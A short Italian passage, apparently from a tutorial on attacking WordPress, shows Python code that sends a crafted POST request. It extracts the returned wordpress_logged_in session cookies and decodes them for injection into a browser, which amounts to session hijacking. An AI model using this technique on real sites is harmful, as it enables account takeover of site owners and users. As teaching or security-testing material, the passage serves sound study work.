Furto della Sessione

# Invio della richiesta POST
response = requests.post(url, json=data)

if response.status_code == 200:
    print("Request successful!\n")
    # WordPress autentica l'utente settando dei Cookie di sessione.
    # Qui li estraiamo dalla risposta del server.
    cookies = response.cookies.get_dict()
    
    for name, value in cookies.items():
        # Decodifichiamo il valore per poterlo iniettare nel browser
        decoded = urllib.parse.unquote(value)
        print(f"Cookie: {name} = {decoded}")

Spiegazione: Se il server risponde 200 OK, ci invia i cookie wordpress_logged_in_[hash]. Questi cookie sono la nostra "chiave d'oro".
